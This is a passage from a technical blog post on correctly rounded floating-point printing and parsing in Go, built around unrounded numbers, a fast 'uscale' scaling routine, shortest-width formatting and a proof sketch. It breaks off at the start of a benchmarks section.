meaning 1½ and 2½ both round to 2.\nWe can do that by adding1+odd(x),\nwhereodd(x)is 0 or 1 according to whetherxis odd.\nThat’s just the low bit ofx:odd(x)=(x&1)=(⟨x⟩>>2)&1.Putting that all together:⌊⟨x⟩⌋=(⟨x⟩+0)>>2(floor)[⟨x⟩]−=(⟨x⟩+1)>>2(round,halfdown)[⟨x⟩]even=(⟨x⟩+1+odd(x))>>2(round,halftoeven)=(⟨x⟩+1+((⟨x⟩>>2)&1))>>2[⟨x⟩]+=(⟨x⟩+2)>>2(round,halfup)⌈⟨x⟩⌉=(⟨x⟩+3)>>2(ceiling)In Go:func (u unrounded) floor() uint64         { return uint64((u + 0) >> 2) }\nfunc (u unrounded) roundHalfDown() uint64 { return uint64((u + 1) >> 2) }\nfunc (u unrounded) round() uint64         { return uint64((u + 1 + (u>>2)&1) >> 2) }\nfunc (u unrounded) roundHalfUp() uint64   { return uint64((u + 2) >> 2) }\nfunc (u unrounded) ceil() uint64          { return uint64((u + 3) >> 2) }fpfmt/fpfmt.go:62,66row(\"x\", \"floor\", \"round½↓\", \"round\", \"round½↑\", \"ceil\")\nfor _, x := range []float64{6, 6.25, 6.5, 6.75, 7, 7.5, 8.5} {\n    u := unround(x)\n    row(u, u.floor(), u.roundHalfDown(), u.round(), u.roundHalfUp(), u.ceil())\n}\ntable()x       floor  round½↓  round  round½↑  ceil\n⟨6.0⟩   6      6        6      6        6\n⟨6.0+⟩  6      6        6      6        7\n⟨6.5⟩   6      6        6      7        7\n⟨6.5+⟩  6      7        7      7        7\n⟨7.0⟩   7      7        7      7        7\n⟨7.5⟩   7      7        8      8        8\n⟨8.5⟩   8      8        8      9        9Dividing unrounded numbers preserves correct rounding as long as the second extra bit\nis maintained correctly: once it is set to 1, it has to stay a 1 in all future results.\nThis gives the second extra bit its shorter name: thesticky bit.To divide an unrounded number, we do a normal divide but force the sticky bit to 1\nwhen there is a remainder.\nRight shift does the same.⟨x/n⟩=(⟨x⟩/n)|(⟨x⟩modn≠0)|(⟨x⟩&1)⟨x>>n⟩=(⟨x⟩>>n)|(⟨x⟩mod2n≠0)|(⟨x⟩&1)For example, if we rounded 15.4 to an integer 15 and then divided it by 6,\nwe’d get 2.5, which rounds down to 2,\nbut the more precise answer would be 15.4/6 = 2.57, which rounds up to 3.\nAn unrounded division handles this correctly:⟨15.4⟩=61‘15.0+’“alittlemorethan15”⟨15.4/6⟩=11‘2.5+’“alittlemorethan2½”[⟨15.4/6⟩]=3Let’s implement division and right shift in Go:func (u unrounded) div(d uint64) unrounded {\n\tx := uint64(u)\n\treturn unrounded(x/d) | u&1 | bool2[unrounded](x%d != 0)\n}\n\nfunc (u unrounded) rsh(s int) unrounded {\n\treturn u>>s | u&1 | bool2[unrounded](u&((1<<s)-1) != 0)\n}fpfmt/fpfmt.go:69,76u := unround(15.1).div(6)\nfmt.Println(u, u.round())⟨2.5+⟩ 3Finally, we are going to need to be able to nudge an unrounded number\nup or down before computing a ceiling or floor,\nas if we added or subtracting a tiny amount.\nLet’s add that:func (u unrounded) nudge(δ int) unrounded { return u + unrounded(δ) }fpfmt/fpfmt.go:67row(\"x\", \"nudge(-1).floor\", \"floor\", \"ceil\", \"nudge(+1).ceil\")\nfor _, x := range []float64{15, 15.1, 15.9, 16} {\n    u := unround(x)\n    row(u, u.nudge(-1).floor(), u.floor(), u.ceil(), u.nudge(+1).ceil())\n}x        nudge(-1).floor  floor  ceil  nudge(+1).ceil\n⟨15.0⟩   14               15     15    16\n⟨15.0+⟩  15               15     16    16\n⟨15.5+⟩  15               15     16    16\n⟨16.0⟩   15               16     16    17Floating-point hardware maintains three extra bits to round\nall arithmetic operations correctly.\nFor just division and right shift, we can get by with only two bits.Unrounded ScalingThe fundamental insight of this post is that all\nfloating-point conversions can be written correctly\nand simply usingunrounded scaling,\nwhich multiplies a numberxby a power of two and a power of ten\nand returns the unrounded product.uscale(x,e,p)=⟨x·2e·10p⟩.Whenpis negative, the value10pcannot be stored exactly in any finite binary floating-point number,\nso any implementation of uscale must be careful.In Go, we can implement uscale using big integers and an unrounded division:func uscale(x uint64, e, p int) unrounded {\n    num :=   mul(big(4), big(x), pow(2, max(0, p)),  pow(10, max(0, e)))\n    denom := mul(                pow(2, max(0, -p)), pow(10, max(0, -e)))\n    div, mod := divmod(num, denom)\n    return unrounded(div.uint64() | bool2[uint64](!mod.isZero()))\n}Themaxexpressions choose between multiplying2eintonumwhene>0or multiplying2−eintodenomwhene<0,\nand similarly for10p.\nThedivmodimplements the floor, andmod.isZeroreports\nwhether the floor was exact.This implementation of uscale is correct but inefficient.\nIn our usage,eandpwill mostly cancel out,\ntypically with opposite signs,\nand the inputxand resultuscale(x,e,p),\nwill always fit in 64 bits.\nThat limited input domain and range makes it possible\nto implement a very fast, completely accurate uscale,\nand we’ll see that implementation later.Our actual implementation will be split into two functions,\nto allow sharing some computations derived frompande.\nInstead ofuscale(x, e, p), the fast Go version will be called asuscale(x, prescale(e, p, log2Pow10(p))).\nAlso, callers are responsible for passing in anxleft-shifted to have its\nhigh bit set.\nTheunpackfunction we looked at already arranged that for its result,\nbut otherwise callers need to do something like:shift = 64 - bits.Len64(x)\n... uscale(x<<shift, prescale(e-shift, p, log2Pow10(p))) ...Conceptually, uscale maps numbers on one fixed-point scale to numbers on another,\nincluding converting between binary and decimal scales.\nFor example, consider the scales2−13and10−4:Givenxfrom the2−13side,uscale(x,−13,4)maps to the equivalent\npoint on the10−4side;\nand givenxfrom the10−4,uscale(x,13,−4)maps to the equivalent\npoint on the2−13side.\nBefore we look at the fast implementation ofuscale,\nlet’s look at how it simplifies all the floating-point printing\nand parsing algorithms.Fixed-Width PrintingOur first application of uscale is fixed-width printing.\nGivenf=m·2e, we want to compute its\napproximate equivalentd·10de, wheredhas exactlyndigits.\nIt only takes 17 digits to uniquely identify any float64,\nso we’re willing to limitn≤18,\nwhich will ensuredfits in a uint64.\nThe strategy is to multiplyfby10pfor somepand then round it to an integerd.\nThen the result isd·10−p.Then-digit requirement meansd=m·2e·10p∈[10n−1,10n).\nFrom this we can derivep:m·2e·10p∈[10n−1,10n)m·2e·10p∈10n−1·[1,10)[factoringrange](log10m·2e)+p∈n−1+[0,1)[takinglog]p∈n−1−(log10m·2e)+[0,1)[isolatingp]p∈n−1−((log10m·2e)−[0,1))[regrouping]p=n−1−⌊log10m·2e⌋[pisaninteger]p=n−1−⌊(log102)·(e+log2m)⌋[changinglogbase]It is okay forpto be too big—we will get an extra digit that we can divide away—so\nwe can approximatelog2masbits(m)−1, wherebits(m)is the bit length ofm.\nThat gives usp=n−1−⌊(log102)·(e+bits(m)−1)⌋.\nWith this derivation ofp, uscale does the rest of the work.The floor expression is a simple linear function and can be computed\nexactly for our inputs using fixed-point arithmetic:// log10Pow2(x) returns ⌊log₁₀ 2**x⌋ = ⌊x * log₁₀ 2⌋.func log10Pow2(x int) int {// log₁₀ 2 ≈ 0.30102999566 ≈ 78913 / 2^18return (x * 78913) >> 18\n}fpfmt/fpfmt.go:78,82Thelog2Pow10function, which we mentioned above and need to\nuse when callingprescale, is similar:// log2Pow10(x) returns ⌊log₂ 10**x⌋ = ⌊x * log₂ 10⌋.func log2Pow10(x int) int {// log₂ 10 ≈ 3.32192809489 ≈ 108853 / 2^15return (x * 108853) >> 15\n}fpfmt/fpfmt.go:84,88Now we can put everything together:// FixedWidth returns the n-digit decimal form of f as d * 10**p.// n can be at most 18.func FixedWidth(f float64, n int) (d uint64, p int) {\n\tif n > 18 {\n\t\tpanic(\"too many digits\")\n\t}\n\tm, e := unpack64(f)\n\tp = n - 1 - log10Pow2(e+63)\n\tu := uscale(m, prescale(e, p, log2Pow10(p)))\n\td = u.round()\n\tif d >= uint64pow10[n] {\n\t\td, p = u.div(10).round(), p-1\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:96,110That’s the entire conversion!The code splitsfintom,e;\ncomputespas just described;\nand then usesuscaleandroundto computed=f·10p.\nIf the result has an extra digit,\neither because our approximate log madeptoo big,\nor because of rollover during rounding,\nwe divide the unrounded form by 10, round again, and updatep.\nWhen we approximatedlog2mby counting bits,\nwe used the exact log of the greatest power of two less than or equal tom,\nso the computeddmust be less than twice the intended limit10n,\nmeaning the leading digit (if there are too many digits) must be 1.\nAnd rollover only happens for ‘999...’,\nso it is not possible to have both an extra digit and rollover.As an example conversion,\nconsider a float64 approximation ofπ(0x1921fb54442d18·2−51) to 15 decimal digits.\nWe havee=−51,n=15, andbits(m)=53,\nsop=n−1−⌊(log102)·(e+bits(m)−1)⌋=14.The2−51and10−14scales align like this:Thenuscale(0x1921fb54442d18,−51,14)returns the unrounded number ‘314159265358979.0+’,\nwhich rounds to 314159265358979.\nOur answer is then314159265358979·10−14.Parsing DecimalsUnrounded scaling also lets us parse decimal representations of floating-point numbers efficiently.\nLet’s assume we’ve taken care of parsing a string like ‘1.23e45’\nand now have an integer and exponent liked=123,p=45−2=43.\nTo convertd·10pto a float64,\nwe can choose an appropriateeso thatd·2e·10p∈[252,253)and then return[uscale(d,e,p)]·2−e.The derivation ofeis similar to the derivation ofpfor printing:d·2e·10p∈[252,253)d·2e·10p∈252·[1,2)[factoringrange](log2d·10p)+e∈52+[0,1)[takinglog]e∈52−(log2d·10p)+[0,1)[isolatinge]e∈52−((log2d·10p)−[0,1))[regrouping]e=52−⌊log2d·10p⌋[pisaninteger]e=52−⌊(log2d)+(log210)·p⌋[changinglogbase]Once again, it is okay to overestimatee, so we can approximatelog2d=bits(d)−1, yieldinge=53−bits(d)−⌊(log210)·p⌋.\nIfeis very large,−ewill be very small,\nmeaning we will be creating a subnormal,\nso we need to round to a smaller number of bits.\nTo handle this, we capeat 1074,\nwhich caps−eat−1074.\nAs before, due to the approximation oflog2d, the scaled result is at most twice as large as our target,\nmeaning it might have one extra bit to shift away.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\te := min(1074, 53-b-log2Pow10(p))\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, log2Pow10(p)))\n\tm := u.round()\n\tif m >= 1<<53 {\n\t\tm, e = u.rsh(1).round(), e-1\n\t}\n\treturn pack64(m, -e)\n}fpfmt/unopt/fpfmt.go:111,125FixedWidthandParsedemonstrate\nexactly how similar printing and parsing really are.\nIn printing, we are givenm,eand\nfindp; thenuscale(m,e,p)converts binary to decimal.\nIn parsing, we are givend,pand finde;\nthenuscale(d,e,p)converts decimal to binary.We can make parsing a little faster with a few hand optimizations.\nThis optimized version introduceslpto avoid callinglog2Pow10twice,\nand it implements the extra digit handling in branch-free code.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\tlp := log2Pow10(p)\n\te := min(1074, 53-b-lp)\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, lp))// This block is branch-free code for://\tif u.round() >= 1<<53 {//\t\tu = u.rsh(1)//\t\te = e - 1//\t}s := bool2[int](u >= unmin(1<<53))\n\tu = (u >> s) | u&1\n\te = e - s\n\n\treturn pack64(u.round(), -e)\n}// unmin returns the minimum unrounded that rounds to x.func unmin(x uint64) unrounded {\n\treturn unrounded(x<<2 - 2)\n}fpfmt/fpfmt.go:112,138Now we are ready for our next challenge: shortest-width printing.Shortest-Width PrintingShortest-width printing means to prepare a decimal representation\nthat a floating-point parser would convert back to the exact samefloat64,\nusing as few digits as possible.\nWhen there are multiple possible shortest decimal outputs,\nwe insist on the one that is nearest the original input,\nnamely the correctly-rounded one.\nIn general, 17 digits are always enough to uniquely identify afloat64,\nbut sometimes fewer can be used, even down to a single digit in numbers like 1, 2e10, and 3e−42.An obvious approach would be to useFixedPrintfor increasing values ofn,\nstopping whenParse(FixedPrint(f, n)) == f.\nOr maybe we should derive an equation fornand then useFixedPrint(f, n)directly.\nSurprisingly, neither approach works:Short(f)is not necessarilyFixedPrint(f, n)for somen.\nThe simplest demonstration of this isf=289=618970019642690137449562112=0x10000000000000·237,\nwhich looks like this:Becausefis a power of two, the floating-point exponent\nchanges atf,\nas does the spacing between floating-point numbers.\nThe next smallest value is0x1ffffffffffff·2−38,\nmarked on the diagram as0xffffffffffff½·2−37.\nThe dotted lines mark the halfway points betweenfand its nearest floating point neighbors.\nThe accurate decimal answers are those at or between the dotted lines,\nall of which convert back tof.The correct rounding offto 16 digits ends in …901: the next digit infis 3,\nso we should round down.\nHowever, because of the spacing change aroundf,\nthat correct decimal rounding does not convert back tof.\nAFixedPrintloop would choose a 17-digit form instead.\nBut there is an accurate 16-digit form, namely …902.\nThat decimal is closer tofthan it is to any other float64,\nmaking it an accurated.\nAnd since the closer 16-digit value …901 is not an accurated,Shortshould use …902 instead.Assuming as usual thatf=m·2e,\nlet’s definefootprint(f)to be the distance between the midpoints fromfto its\nfloating-point neighbors.\nNormally those neighbors are2ein either direction—the midpoints are(m±½)·2e—sofootprint(f)=2e.\nAt a power of two with an exponent change,\nthe lower midpoint is instead(m−¼)·2e,\nsofootprint(f)=¾·2e.\nThe rounding paradox can only happen for powers of two\nwith this kind of skewed footprint.All that is to say we cannot useFixedWidthwith “the rightn”.\nBut we can use scale directly with “the rightp.”\nSpecifically, we can compute the midpoints betweenfand its floating-point neighbors\nand scale them to obtain the\nminimum and maximum valid choices ford.\nThen we can make the best choice:If one of the validdends in 0, use it after removing trailing zeros.(Choosing the rightpwill allow at most ten consecutive integers,\nso at most will one end in 0.)If there is only one validd, use it.Otherwise there are at least two validd, at least one on each side off;\nuse the correctly rounded one.Here is an example of the first case: one of the validdends in zero.We already saw an example of the second case: only one validd.\nFor numbers with symmetric footprints, that will be the\ncorrectly roundedd.\nAs we saw for numbers with skewed footprints,\nthat may not be the correctly roundedd,\nbut it is still the correct answer.Finally, here is an example of the third case: multiple validd,\nbut none that end in zero.\nNow we should use the correctly rounded one.This sounds great, but how do we determine the rightp?\nWe wantfootprint(f)to allow at least one decimal integer,\nbut at most ten, meaning1≤footprint(f)<10.\nLuckily, we can hit that target exactly.For a symmetric footprint:footprint(f)·10p∈[1,10)2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/2e)·[1,10)[isolatingp]p∈−(log102)·e+[0,1)[takinglog]p∈−((log102)·e−[0,1))[regrouping]p=−⌊(log102)·e⌋[pisaninteger]For a skewed footprint:footprint(f)·10p∈[1,10)¾·2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/(¾·2e))·[1,10)[isolatingp]p∈−(log10¾+(log102)·e)+[0,1)[takinglog]p∈−(log10¾+(log102)·e−[0,1))[regrouping]p=−⌊log10¾+(log102)·e⌋[pisaninteger]For the symmetric footprint, we can uselog10Pow2,\nbut for the skewed footprint, we need a new approximation:// skewed computes the skewed footprint of m * 2**e,// which is ⌊log₁₀ 3/4 * 2**e⌋ = ⌊e*(log₁₀ 2)-(log₁₀ 4/3)⌋.func skewed(e int) int {\n\treturn (e*631305 - 261663) >> 21\n}fpfmt/fpfmt.go:234,238We should worry about a footprint with decimal width exactly 1,\nsince iffhad an odd mantissa,\nthe midpoints would be excluded.\nIn that case, if the decimals were the exact midpoints,\nthere would be no decimal between them,\nmaking the conversion invalid.\nBut it turns out we should not worry too much.\nFor a skewed footprint,¾·2e·10pcan never be exactly 1,\nbecause nothing can divide away the 3.\nFor a symmetric footprint,2e·10p=1can only happen fore=p=0,\nbut then scaling is a no-op,\nso that the decimal integers are exactly the binary integers.\nThe non-integer midpoints map to non-integer decimals.When we compute the decimal equivalents of the midpoints,\nwe will use ceiling and floor instead of rounding them,\nto make sure the integer results are valid decimal answers.\nIf the mantissamis odd, we will nudge the unrounded forms\ninward slightly before taking the ceiling or floor,\nsince rounding will be away fromm.The Go code is:// Short computes the shortest formatting of f,// using as few digits as possible that will still round trip// back to the original float64.func Short(f float64) (d uint64, p int) {\n\tconst minExp = -1085\n\n\tm, e := unpack64(f)\n\n\tvar min uint64\n\tz := 11// extra zero bits at bottom of m; 11 for 53-bit mif m == 1<<63 && e > minExp {\n\t\tp = -skewed(e + z)\n\t\tmin = m - 1<<(z-2)// min = m - 1/4 * 2**(e+z)} else {\n\t\tif e < minExp {\n\t\t\tz = 11 + (minExp - e)\n\t\t}\n\t\tp = -log10Pow2(e + z)\n\t\tmin = m - 1<<(z-1)// min = m - 1/2 * 2**(e+z)}\n\tmax := m + 1<<(z-1)// max = m + 1/2 * 2**(e+z)odd := int(m>>z) & 1\n\n\tpre := prescale(e, p, log2Pow10(p))\n\tdmin := uscale(min, pre).nudge(+odd).ceil()\n\tdmax := uscale(max, pre).nudge(-odd).floor()\n\n\tif d = dmax / 10; d*10 >= dmin {\n\t\treturn trimZeros(d, -(p - 1))\n\t}\n\tif d = dmin; d < dmax {\n\t\td = uscale(m, pre).round()\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:198,232Notice that this algorithm requires either two or three calls touscale.\nWhen the number being printed has only one valid representation\nof the shortest length, we avoid the third call touscale.\nAlso notice that theprescaleresult is shared by all three calls.Whenm=263,min<263,\nmeaning it won’t be left shifted as far as possible\nduring the call touscale.\nAlthough we could detect this case and calluscalewith2·minande−1,\nusingminunmodified is fine:\nit is still shifted enough that the bitsuscaleneeds to return will stay in the high 64 bits of the 192-bit product,\nand using the sameelets us use the sameprescalework for all three calls.Trimming ZerosThetrimZerosfunction used inShortremoves any trailing zeros from its argument,\nupdating the decimal power. An unoptimized version is:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tif x%10 != 0 {\n\t\treturn x, p\n\t}\n\tx /= 10\n\tp += 1\n\n\tif x%100000000 == 0 {\n\t\tx /= 100000000\n\t\tp += 8\n\t}\n\tif x%10000 == 0 {\n\t\tx /= 10000\n\t\tp += 4\n\t}\n\tif x%100 == 0 {\n\t\tx /= 100\n\t\tp += 2\n\t}\n\tif x%10 == 0 {\n\t\tx /= 10\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/unopt/fpfmt.go:227,254The initial removal of a single zero gives an early return for\nthe common case of having no zeros.\nOtherwise, the code makes four additional checks that\ncollectively remove up to 16 more zeros.\nFor outputs with many zeros, these four checks run faster\nthan a loop removing one zero at a time.When compiling this code,\nthe Go compiler reduces the remainder checks to multiplications\nusing the following well-known optimization.\nAn exactuint64divisionx/cwherexmodc=0can be implemented byx·mwheremis theuint64multiplicative inverse ofc, meaningm·cmod264=1:\nSincecis also the multiplicative inverse ofm,x·mis\nlossless—all the exact multiples ofcmap to all of[0,(264−1)/c]—so\nthe non-multiples are forced to map to larger values.\nThis observation gives a quick test for whetherxis an exact multiple ofc:\ncheck whetherx·m≤(264−1)/c.Only oddchave multiplicative inverses modulo powers of two,\nso even divisors require more work.\nTo compute an exact divisionx/(c<<s),\nwe can use(x/c)>>sinstead.\nTo check for remainder, we need to check that those lowsbits are all zero before we shift them away.\nWe can merge that check with the range check by rotating those bits\ninto the high part instead of discarding them:\ncheck whetherx·m↻>s≤(264−1)/c,\nwhere↻>is right rotate.The Go compiler does this transformation automatically\nfor theifconditions intrimZeros,\nbut inside theifbodies, it does not reuse the\nexact quotient it just computed.\nI considered changing the compiler to recognize that pattern,\nbut instead I wrote out the remainder check by hand\nin the optimized version, allowing me to reuse the computed exact quotients:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tconst (\n\t\tmaxUint64 = ^uint64(0)\n\t\tinv5p8    = 0xc767074b22e90e21// inverse of 5**8inv5p4    = 0xd288ce703afb7e91// inverse of 5**4inv5p2    = 0x8f5c28f5c28f5c29// inverse of 5**2inv5      = 0xcccccccccccccccd// inverse of 5)// Cut 1 zero, or else return.if d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t} else {\n\t\treturn x, p\n\t}// Cut 8 zeros, then 4, then 2, then 1.if d := bits.RotateLeft64(x*inv5p8, -8); d <= maxUint64/100000000 {\n\t\tx = d\n\t\tp += 8\n\t}\n\tif d := bits.RotateLeft64(x*inv5p4, -4); d <= maxUint64/10000 {\n\t\tx = d\n\t\tp += 4\n\t}\n\tif d := bits.RotateLeft64(x*inv5p2, -2); d <= maxUint64/100 {\n\t\tx = d\n\t\tp += 2\n\t}\n\tif d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/fpfmt.go:240,278This approach to trimming zeros is from Dragonbox.\nFor more about the general optimization,\nsee Warren’sHacker’s Delight[34],\nsections 10-16 and 10-17.Fast, Accurate ScalingThe conversion algorithms we examined are nice and simple.\nFor them to be fast,uscaleneeds to be fast while remaining correct.\nAlthough multiplication by2ecan be implemented by shifts,uscalecannot actually compute or multiply by10p—that would take too long whenpis a large positive or negative number.\nInstead, we can approximate10pas a floating-point numberpm·2pewith a 128-bit mantissa,\nlooked up in a table indexed byp.\nSpecifically, we will usepe=⌊log210p⌋−127andpm=⌈10p/2pe⌉,\nensuring thatpm∈[2127,2128).\nWe will write a separate program to generate this table.\nIt emits Go code definingpow10Min,pow10Max, andpow10Tab:pow10Tab[0]holds the entry forp=pow10Min.\nTo figure out how big the table needs to be,\nwe can analyze the three functions we just wrote.FixedWidthconverts floating-point to decimal.\nIt needs to calluscalewith a 53-bitx,e∈[−1137,960], andp∈[−307,341].Shortalso converts floating-point to decimal.\nIt needs to calluscalewith a 55-bitx,e∈[−1137,960], andp∈[−292,324].Parseconverts decimal to floating-point.\nIt needs to calluscalewith a 64-bitxandp∈[−343,289].\n(Outside that range ofp,Parsecan return 0 or infinity.)So the table needs to provide answers forp∈[−343,341].If10p≈pm·2pe, thenx·2e·10p≈x·pm·2e+pe.\nIn all of our algorithms, the result ofuscalewas always small—at most 64 bits.\nSincepmis 128 bits andx·pmis even bigger,e+pemust be negative,\nso this computation is(x*pm) >> -(e+pe).\nBecause of the ceiling,pmmay be too large by an errorε0<1,\nsox·pmmay be too large by an errorε1=x·ε0<x.\nTo round exactly, we care whether any of the shifted bits is 1,\nbutε1may change the lowbits(x)bits,\nso we can’t trust them.\nInstead, we will throw them away.\nand use only the upper bits to compute our unrounded number.\nThat is the entire idea!Now let’s look at the implementation.\nTheprescalefunction returns ascalerwithpmand a shift counts:// A scaler holds derived scaling constants for a given e, p pair.type scaler struct {\n\tpm pmHiLo\n\ts  int\n}// A pmHiLo represents hi<<64 + lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/unopt/fpfmt.go:256,266We want the shift count to reserve two extra bits for the unrounded\nrepresentation and to apply to the top 64-bit word of the 192-bit product,\nwhich gives this formula:s=−(e+pe)−2−(192−64)=−(e+⌊log210p⌋−127)−2−128=−(e+⌊log210p⌋+3)That translates directly to Go:// prescale returns the scaling constants for e, p.// lp must be log2Pow10(p).func prescale(e, p, lp int) scaler {\n\treturn scaler{pm: pow10Tab[p-pow10Min], s: -(e + lp + 3)}\n}fpfmt/fpfmt.go:292,296Inuscale, since the caller left-justifiedxto 64 bits,\ndiscarding the lowbits(x)bits means discarding the\nlowest 64 bits of the product, which we skip computing entirely.\nThen we use the middle 64-bit word and the lowsbits\nof the upper word to set the sticky bit in the result.// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\tmid, carry := bits.Add64(mid, mid2, 0)\n\thi += carry\n\tsticky := bool2[unrounded](mid != 0 || hi&((1<<c.s)-1) != 0)\n\treturn unrounded(hi>>c.s) | sticky\n}fpfmt/unopt/fpfmt.go:302,312It is mind-boggling that this works, but it does.\nOf course, you shouldn’t take my word for it.\nWe have to prove it correct.Sketch of a Proof of Fast ScalingTo prove that our fastuscalealgorithm is correct,\nthere are three cases: small positivep,\nsmall negativep,\nand largep.\nThe actual proof, especially for largep,\nis non-trivial,\nand the details are quite a detour from\nour fast scaling implementations,\nso this section only sketches the basic ideas.\nFor the details, see the accompanying post, “Fast Unrounded Scaling: Proof by Ivy.”Remember from the previous section thatpm=⌈10p/2pe⌉=10p/2pe+ε0for someε0<1.\nSince10p=5p·2p,pm’s 128 bits need only represent the5ppart; the2pcan always be handled bype.Forp∈[0,27),5pfits in the top 64 bits of the 128-bitpm.\nSincepmis exact,\nthe only possible error is introduced by discarding the bottombits(x)bits.\nSince the bottom 64 bits ofpmare zero,\nthe bits we discard are all zero.\nSouscaleis correct for small positivep.Forp∈[−27,−1],x·pmis approximating division by5−p(remember that−pis a positive number!).\nThe 128-bit approximation is precise enough that whenxis a\nmultiple of5−p, only the lowestbits(x)bits are non-zero;\ndiscarding them keeps the unrounded form exact.\nAnd whenxis not a multiple of5−p,\nthe result has a fractional part that must be at least1/5−paway from an integer.\nThat fractional separation is much larger than the maximum error in the product,\nso the high bits saved in the unrounded form are correct;\nthe fraction is also repeating, so that there is guaranteed\nto be a 1 bit to cause the unrounded form to be marked inexact.\nSouscaleis correct for small negativep.Finally, we must handle largep, which always have a non-zero error\nand therefore should always return unrounded numbers marked inexact\n(with the sticky bit set to 1).\nConsider the effect of adding a small error to the idealized “correct”x·10p/2pe,\nproducingx·pm.\nThe error is at most 64 bits.\nAdding that error to the 192-bit product can certainly affect\nthe low 64 bits, and it may also generate a carry out of the low 64\ninto the middle 64 bits.\nThe carry turns 1 bits into 0 bits from right to left\nuntil it hits a 0 bit;\nthat first 0 bit becomes a 1, and the carry stops.\nThe key insight is that seeing a 1 in the middle bits\nis proof that the carry did not reach the high bits,\nso the high bits are correct.\n(Seeing a 1 in the middle bits also ensures that\nthe unrounded form is marked inexact, as it must be,\neven though we discarded the low bits.)\nUsing a program backed by careful math, we can analyze all thepmin our table,\nshowing that every possiblex·pmhas a 1 in the middle bits.\nSouscaleis correct for largep.Omit Needless MultiplicationsWe have a fast and correctuscale, but we can make it faster\nnow that we understand the importance of carry bits.\nThe idea is to compute the high 64 bits of the product\nand then use it directly whenever possible, avoiding the computation\nof the remaining 64 bits at all.\nTo make this work, we need the high 64 bits to be rounded up,\na ceiling instead of a floor.\nSo we will change thepmHiLofrom representinghi·264+lotohi·264−lo.// A pmHiLo represents hi<<64 - lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/fpfmt.go:280,284The exact computation using this form would be:hi, mid := bits.Mul64(x, c.pm.hi)\nmid2, lo := bits.Mul64(x, c.pm.lo)\nmid, carry := bits.Sub64(mid, mid2, bool2[uint64](lo > 0))\nhi -= carry\nreturn unrounded(hi >> c.s) | bool2[unrounded](hi&((1<<c.s)-1) != 0 || mid != 0)The 128-bit productx·pm.hicomputed on the first line\nmay be too big by an error of up to264,\nwhich may or may not affect the high 64 bits;\nThe middle three lines correct the product,\npossibly subtracting 1 fromhi.\nLike in the proof sketch, if any of the bottomsbits of the approximatehiis a 1 bit,\nthat 1 bit would stop the subtracted carry from\naffecting the higher bits, indicating that we don’t need to correct the product.Using this insight, the optimizeduscaleis:// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tsticky := uint64(1)\n\tif hi&(1<<(c.s&63)-1) == 0 {\n\t\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\t\tsticky = bool2[uint64](mid-mid2 > 1)\n\t\thi -= bool2[uint64](mid < mid2)\n\t}\n\treturn unrounded(hi>>c.s | sticky)\n}fpfmt/fpfmt.go:298,310The fix-up looks different from the exact computation above\nbut it has the same effect.\nWe don’t need the actual final value ofmid, only the carry\nand its effect on the sticky bit.On some systems, notably x86-64,bits.Mul64computes both results in a single instruction.\nOn other systems, notably ARM64,bits.Mul64must use two different instructions;\nit helps on those systems to write the code this way,\noptimizing away the computation for the low half ofx·pm.lo.The more bits that are being shifted out ofhi,\nthe more likely it is that a 1 bit is being shifted out,\nso that we have an answer after only the firstbits.Mul64.\nWhenShortcallsuscale, it passes twoxthat\ndiffer only in a single bit\nand multiplies them by the samepm.hi.\nWhile one of them might clear the lowsbits ofhi,\nthe other is unlikely to also clear them,\nso we are likely to hit the fast path at least once,\nif not twice.\nIn the case whereShortcallsuscalethree times,\nwe are likely to hit the fast path at least twice.\nThis optimization means that, most of the time, auscaleis implemented by a single wide multiply.\nThis is the main reason thatShortruns faster than\nRyū, Schubfach, and Dragonbox, as we will see in the next section.PerformanceI promised these algorithms would be simpleandfast.\nI hope you are convinced about simple.\n(If not, keep in mind that the implementations in widespread\nuse today are far more complicated!)\nNow it is time to evaluate ‘fast’\nby comparing against other implementations.\nAll the other implementations are written in C or C++ and compiled by a C/C++ compiler.\nTo isolate compilation differences,\nI translated the Go code to C and measured\nboth the Go code and the C translation.I ran the benchmarks on two systems.Apple M4 (2025 MacBook Air ‘Mac16,12’), 32 GB RAM, macOS 26.1, Apple clang 17.0.0 (clang-1700.6.3.2)AMD Ryzen 9 7950X, 128 GB RAM, Linux 6.17.9 and libc6 2.39-0ubuntu8.6, Ubuntu clang 18.1.3 (1ubuntu1)Both systems used Go 1.26rc1.\nThe full benchmark code is in thersc.io/fpfmtpackage.Printing TextReal implementations generate strings, so we need to write\ncode to convert the integers we have been returning into digit sequences,\nlike this:// formatBase10 formats the decimal representation of 